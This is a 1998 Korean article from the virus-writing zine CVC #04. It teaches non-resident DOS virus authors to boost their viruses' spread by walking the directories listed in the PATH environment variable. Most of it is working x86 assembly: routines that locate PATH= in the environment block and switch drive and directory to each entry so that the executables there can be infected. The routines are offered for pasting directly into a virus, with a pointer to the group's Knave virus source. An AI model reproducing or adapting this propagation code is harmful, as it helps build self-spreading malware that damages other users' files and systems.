
 PATH 를 이용하자 !                                              CVC #04  98/05

-------------------------------------------------------------------> Red_Devils

  지금까지 CVC 에서 공개한 비상주형 바이러스들은 현재 디렉토리 혹은 상위 디
렉토리에서만 감염파일을 찾는다. 이같은 방법을 사용해서는 자신의 바이러스가
널리 퍼지지 못한다. 지금까지의 방법 보다는 훨씬 감염력이 뛰어난 방법을 설명
하겠다. 바로 PATH 를 이용하는 것이다.

  비상주형 바이러스는 개인적으로 흥미롭기는 하지만 상주형 바이러스보다 오히려
제작하기가 상당히 귀찮다. 또 널리 퍼지지 못하는 단점도 있다. 바이러스를 퍼뜨리
는게 목적이 아니라 연구가 목적이라면 비상주형 바이러스도 도전거리 일것이다.

  다음 내용은 1995 년 KOV 가 PATH 를 이용하는 바이러스 관련 글을 재편집하였고
버그들을 수정했다. 내용을 그냥 바이러스에 붙이면 끝난다.

  Get_Path_Address : 경로 주소를 얻는 함수이다.
  Use_Path         : 지정된 경로로 디렉토리를 이동한다.

  실제 바이러스 응용은 Knave virus 소스를 참고하기 바란다. 비상주형 바이러
스에서 사용될 수 있는 몇가지 기법들을 넣어 두었다.

  도스 환경영역에는 PATH= 가 들어간다. 이건 누구나 아는 경로명 지정이다.
  PATH=로 지정된 경로를 따라 돌아다니는 바이러스들이 있다.비엔나가 대표적인데
소스가 공개되면서 수많은 변형들이 만들어졌다. KOV 도 Miny2.555 를 공개했으나 버
그가 존재했다. CVC 에서는 Knave 를 공개하였고 이 바이러스는 PATH 를 따라 다니면
서 3 개의 COM 파일을 감염시킨다. 다음 버전은 EXE 파일도 감염시킬 것이다.


  Get_Path_Address:

  먼저 환경영역 세그먼트가 필요하다. PSP [002Ch] 의 주소값이 환경영역 주소이다.
  다음은 나의 컴퓨터 환경이다. 물론 컴퓨터 마다 이런 환경은 다르다.

  PSP 의 [002C] 0893h 라는 값을 가지고있으므로 0893h 세그먼트를 확인해야 한다.

0893:0000                                               4D   CONFIG=START1.TM
0893:0010  50 3D 43 3A 5C 57 49 4E-44 4F 57 53 5C 54 45 4D   P=C:\WINDOWS\TEM
0893:0020  50 00 54 45 4D 50 3D 43-3A 5C 57 49 4E 44 4F 57   P.TEMP=C:\WINDOW
0893:0030  53 5C 54 45 4D 50 00 50-52 4F 4D 50 54 3D 24 70   S\TEMP.PROMPT=$p
0893:0040  24 67 00 77 69 6E 62 6F-6F 74 64 69 72 3D 43 3A   $g.winbootdir=C:
0893:0050  5C 57 49 4E 44 4F 57 53-00 43 4F 4D 53 50 45 43   \WINDOWS.COMSPEC
0893:0060  3D 43 3A 5C 57 49 4E 44-4F 57 53 5C 43 4F 4D 4D   =C:\WINDOWS\COMM
0893:0070  41 4E 44 2E 43 4F 4D 00-49 4E 43 4C 55 44 45 3D   AND.COM

                         ~~  생     략   ~~

0893:00A0                    77 69-6E 64 69 72 3D 43 3A 5C         windir=C:\
0893:00B0  57 49 4E 44 4F 57 53 00-42 4C 41 53 54 45 52 3D   WINDOWS.BLASTER=
0893:00C0  41 32 32 30 20 49 35 20-44 31 20 48 35 20 50 33   A220 I5 D1 H5 P3
0893:00D0  33 30 20 54 36 20 45 36-32 30 00 50 41 54 48 3D   30 T6 E620.PATH=
                                                                        ~~~~
                                                                경로명 ---^

0893:00E0  43 3A 5C 55 54 49 4C 3B-43 3A 5C 57 49 4E 44 4F   C:\UTIL;C:\WINDO
0893:00F0  57 53 5C 43 4F 4D 4D 41-4E 44 3B 43 3A 5C 54 4F   WS\COMMAND;C:\TO
0893:0100  4F 4C 3B 43 3A 5C 48 4E-43 00                     OL;C:\HNC.
                                                      여기까지 경로 --^

                                         43 4D 44 4C 49 4E             CMDLIN
0893:0110  45 3D 64 65 62 75 67 20-00 00 01 00 43 3A 5C 57   E=debug ....C:\W
0893:0120  49 4E 44 4F 57 53 5C 43-4F 4D 4D 41 4E 44 5C 44   INDOWS\COMMAND\D
0893:0130  45 42 55 47 2E 45 58 45-00 3A 5C 57 49 4E 44 4F   EBUG.EXE.:\WINDO

  우리가 AUTOEXEC.BAT 에 PATH 로 지정한 내용들이있다. 비상주형 바이러스에게는
PATH 내의 실행파일을 감염시키는 것이 유리하다. 다른 컴퓨터로 퍼지는데는 문제
가 있다.

 아래 루틴은 환경영역에서 PATH= 을 찾아서 첫 스트링 위치를 알아 낸다.

 Get_PATH_Address:
            mov     DS,[EnvirAddr]             ; 환경영역 주소값
            xor     si,si
            mov     cx, 5000h                  ; 반복횟수
 Search_PATH:
            lodsb                              ; DS:SI -> AL
            cmp     AL,'P'                     ; Path=
            jnz     SP_Loop
            mov     ax,DS:[SI]
            cmp     ax,'TA'
            jnz     SP_Loop
            cmp     word ptr DS:[SI+2],'=H'    ; patH=
            jz      SavePATH
 SP_Loop:   loop    Search_PATH
 SavePATH:  add     SI,0004                    ; SI 는 P 위치에 있다. !
            mov     word ptr CS:PathAddr,SI    ; 경로의 주소
            mov     DI, offset PathName        ; 파일 이름을 처음으로함(처음
            RET                                ; 는 현재디렉토리만 감염)

  위에서 일단 P 를 찾는다. 다음 문자가 AT 인지 보고 맞으면 마지막으로 H=인지 검
사한다. 다 맞으면 +4를 더한다.이것은 SI 가 P 위치를 가리키므로 +4 해서 실제 경
로명을 얻어 내는 것이다.

  예를들어, PATH=C:;C:/DOS;C:/VIRUS 일때 +4 해서 C:의 C 위치로 SI 가 지정된다.


  Use_Path:

  실제로 경로를 변경하는 루틴이다. 비엔나 바이러스가 해당 디렉토리에서 파일을
찾는 방법을 사용했지만 CVC 에서는 해당 디렉토리로 직접 이동하는 방법을 사용했
다.

  원리는 간단하다. 경로명에서 디렉토리구별은 ; 로 한다. 환경영역에서 디렉토리를
바이러스 버퍼로 가져 오면서 ; 이면 디렉토리 끝이므로 디렉토리 끝을 알리는 0 을
바이러스 버퍼에 넣어주고 디렉토리 이동 (3Bh) 를 사용해서 해당 디렉토리로 이동
한다.

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; 기능 : PathAddr 에 저장된 주소값을 PathBuffer 로 복사한후 해당 디렉토리로
;        이동한다. PathAddr 이 0 이면 더이상의 경로가 없다.
;
; 입력 : None
; 리턴 : 정  상 : 해당 PATH 로 이동
;        에러시 : AL = FFh
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Use_PATH   proc  near                  ; 더이상 사용할 경로가
            push  ds
            mov   al, 0FFh
            cmp   word ptr PathAddr,0000; 없는가?
            jz    Use_Path_Exit
            xor   al,al
 Set_PathInit:
            mov   si, word ptr PathAddr ; 경로 위치 오프셋
            mov   ds, word ptr EnvirAddr; 환경역역 주소
            mov   di, offset PathBuffer ; 파일 이름

 UP_Loop:   lodsb                       ;
            dec   al
            cmp   AL, ';'-1             ; 디렉토리 구별인가?
            jz    UP_01
            cmp   al,0FFh               ; PATH 끝인가?
            jz    NomorePATH
            inc   al
            stosb                       ; 복사
            jmp   UP_Loop

 NomorePATH:
            xor   si,si                 ; 더이상의 디렉토리가 없다.

 UP_01:     mov   word ptr CS:PathAddr,SI    ; 경로 주소값
            xor   al,al
            stosb
            push  cs
            pop   ds

            mov   ah, 0Eh
            mov   dl, byte ptr PathBuffer
            sub   dl, 'A'
            int   21h
            jc    Use_Path

            mov   ah,3Bh                ; 해당 디렉토리로 이동
            mov   dx, offset PathBuffer
            Int   21h
            jc    Use_Path
 Use_Path_Exit:
            pop   ds
            ret
 Use_Path   endp

  위의 함수는 지정된 환경영역에서 경로명을 가져온다.
  드라이브를 바꾸는 내용이 있을꺼다.

* Function 0Eh 디스크 선택

  디폴트 디스크 드라이브를 변경한다.
  호출 레지스터 : AH  0Eh
                  DL  드라이브 번호 (A=0 부터 Z=25)
  리턴 레지스터 : AL  논리적 드라이브의 번호

  C:\> 에서
  C:\> CD D:\TEST
  해 보라. 과연
  D:\TEST> 가 나올까 ?
  실제로 나오지 않는다. 나 역시 바이러스를 제작하면서 안 사실이다. 디렉토리를
변경하는 3Bh 로는 드라이브가 변경되지 않는다.

  사용자들이 경로명을 지정할때 항상 C 드라이브만 사용하지는 않는다. 드라이브를
바꾸지 않으면 현재 드라이브의 디렉토리가 아니면 디렉토리로 이동하지 않는다
  그래서, 바이러스 테스트 중에 드라이브 변경 루틴을 집어 넣게 되었다.

  드라이브 번호는 0 이 A, 1 이 B ... 식이므로 PATH 에 D:\TEST; 로 되어 있다면
  D 에서 'A' 만큼 빼면 해당 드라이브가 숫자로 나온다.
  이걸 사용해서 드라이브를 이동하면된다.
  물론 바이러스 감염이 끝나면 드라이브를 정상적으로 변경해야 한다.

  Knave 바이러스 소스를 참고 하면 자세히 알수 있다.
